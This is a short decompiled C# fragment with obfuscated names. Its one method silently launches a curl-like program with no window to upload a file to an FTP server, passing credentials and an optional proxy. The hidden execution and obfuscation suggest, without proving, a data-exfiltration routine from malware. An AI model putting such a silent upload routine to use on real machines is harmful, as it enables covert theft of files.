using System;
using System.Diagnostics;
using System.IO;

// Token: 0x02000010 RID: 16
internal static class j
{
	// Token: 0x06000060 RID: 96 RVA: 0x00006824 File Offset: 0x00004A24
	internal static void a(string A_0, string A_1, string A_2, string A_3, string A_4, string A_5, string A_6, string A_7)
	{
		new Process
		{
			StartInfo = 
			{
				UseShellExecute = false,
				CreateNoWindow = true,
				FileName = A_0,
				WorkingDirectory = Path.GetDirectoryName(A_0),
				Arguments = (string.IsNullOrEmpty(A_6) ? "" : string.Format(" -U {0}:{1} ", A_6, A_7)) + (string.IsNullOrEmpty(A_5) ? "" : string.Format(" -x {0} ", A_5)) + string.Format(" -T {0} ftp://{1}:{2}@{3}", new object[]
				{
					A_4,
					A_2,
					A_3,
					A_1
				})
			}
		}.Start();
	}
}
